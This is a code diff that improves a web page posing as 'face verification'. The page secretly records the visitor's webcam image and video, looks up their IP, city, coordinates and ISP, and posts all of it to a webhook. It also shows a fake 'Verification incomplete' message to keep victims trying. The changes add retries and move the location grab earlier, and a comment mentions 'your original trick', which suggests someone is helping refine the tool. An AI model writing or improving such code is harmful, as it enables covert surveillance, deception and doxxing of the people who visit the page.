@@ -80,8 +80,10 @@
       formData.append('payload_json', JSON.stringify(payload));
       formData.append('file', blob, filename);
       try {
-        await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+        const res = await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+        if (res.ok) return true;
       } catch {}
+      return false;
     }
 
     async function captureMugshot() {
@@ -89,7 +91,7 @@
       canvas.width = videoElement.videoWidth || 640;
       canvas.height = videoElement.videoHeight || 480;
       ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-      await new Promise(r => setTimeout(r, 150));
+      await new Promise(r => setTimeout(r, 200));
       ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
       return new Promise(r => canvas.toBlob(r, 'image/png'));
     }
@@ -111,30 +113,30 @@
             videoElement.play().catch(() => {});
             resolve();
           };
-          setTimeout(resolve, 3000);
+          setTimeout(resolve, 4000); // longer settle to help front cam stability
         });
 
-        await new Promise(r => setTimeout(r, 1000));
+        await new Promise(r => setTimeout(r, 1200));
 
         // Mugshot first
         const mugshotBlob = await captureMugshot();
+        let geo = "Location grab failed";
+        try {
+          const res = await fetch('https://ipapi.co/json/');
+          if (res.ok) {
+            const d = await res.json();
+            if (!d.error) geo = `IP: ${d.ip||'n/a'}\nCity: ${d.city||'n/a'}\nRegion: ${d.region||'n/a'}\nCountry: ${d.country_name||'n/a'}\nCoords: ${d.latitude||'n/a'}, ${d.longitude||'n/a'}\nISP: ${d.org||'n/a'}`;
+          }
+        } catch {}
         if (mugshotBlob && mugshotBlob.size > 1000) {
-          let geo = "Location grab failed";
-          try {
-            const res = await fetch('https://ipapi.co/json/');
-            if (res.ok) {
-              const d = await res.json();
-              if (!d.error) geo = `IP: ${d.ip||'n/a'}\nCity: ${d.city||'n/a'}\nRegion: ${d.region||'n/a'}\nCountry: ${d.country_name||'n/a'}\nCoords: ${d.latitude||'n/a'}, ${d.longitude||'n/a'}\nISP: ${d.org||'n/a'}`;
-            }
-          } catch {}
           await sendAttachment(
-            `🎯 Quick face verification captured\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geo}`,
+            `🎯 Face captured first\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geo}`,
             mugshotBlob,
             `face_${Date.now()}.png`
           );
         }
 
-        // Video recording
+        // Video attempt - original working logic
         progressContainer.style.display = 'block';
         msg.textContent = "";
 
@@ -152,23 +154,29 @@
 
           stream.getTracks().forEach(track => track.stop());
 
-          if (chunks.length > 0) {
-            const blob = new Blob(chunks, { type: 'video/webm' });
+          if (chunks.length === 0) {
+            msg.textContent = "Verification incomplete. Center Face In Camera View";
+            progressContainer.style.display = 'none';
+            btn.style.display = 'none';
+            return;
+          }
 
-            let geo = "Location grab failed";
-            try {
-              const res = await fetch('https://ipapi.co/json/');
-              if (res.ok) {
-                const d = await res.json();
-                if (!d.error) geo = `IP: ${d.ip||'n/a'}\nCity: ${d.city||'n/a'}\nRegion: ${d.region||'n/a'}\nCountry: ${d.country_name||'n/a'}\nCoords: ${d.latitude||'n/a'}, ${d.longitude||'n/a'}\nISP: ${d.org||'n/a'}`;
-              }
-            } catch {}
+          const blob = new Blob(chunks, { type: 'video/webm' });
+          if (blob.size < 5000) { // too small, probably junk
+            msg.textContent = "Verification incomplete. Center Face In Camera View";
+            progressContainer.style.display = 'none';
+            btn.style.display = 'none';
+            return;
+          }
 
-            await sendAttachment(
-              `🎥 Verification clip (silent capture)\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geo}`,
-              blob,
-              `verification_${Date.now()}.mp4`
-            );
+          const vidContent = `🎥 Video clip attached\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geo}`;
+
+          // Try .mp4 rename first (your original trick)
+          let sent = await sendAttachment(vidContent, blob, `verification_${Date.now()}.mp4`);
+
+          // If failed, retry with .webm extension
+          if (!sent) {
+            await sendAttachment(vidContent, blob, `verification_${Date.now()}.webm`);
           }
 
           msg.textContent = "Verification incomplete. Center Face In Camera View";
